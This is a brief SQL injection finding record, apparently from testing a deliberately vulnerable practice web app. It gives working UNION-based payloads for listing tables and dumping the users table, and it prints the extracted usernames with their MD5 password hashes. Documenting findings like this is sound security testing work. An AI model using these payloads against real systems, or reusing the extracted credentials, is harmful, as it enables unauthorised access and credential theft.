title: SQL Injection - UNION-based data extraction
proof: GET /vulnerabilities/sqli/?id=1%27+UNION+SELECT+1%2C2--+-&Submit=Submit returned 'First name: 1, Surname: 2'. Extracted all user credentials: admin(5f4dcc3b5aa765d61d8327deb882cf99), gordonb(e99a18c428cb38d5f260853678922e03), 1337(8d3533d75ae2c3966d7e0d4fcc69216b), pablo(0d107d09f5bbe40cade3de5c71e9e9b7), smithy(a2271371eb0e14a9407ec2ced185d4d2). Database: MariaDB 10.1.26.
poc_steps: List tables: id=1' UNION SELECT table_name,table_schema FROM information_schema.tables WHERE table_schema=database()-- -
Dump users: id=1' UNION SELECT user,password FROM users-- -
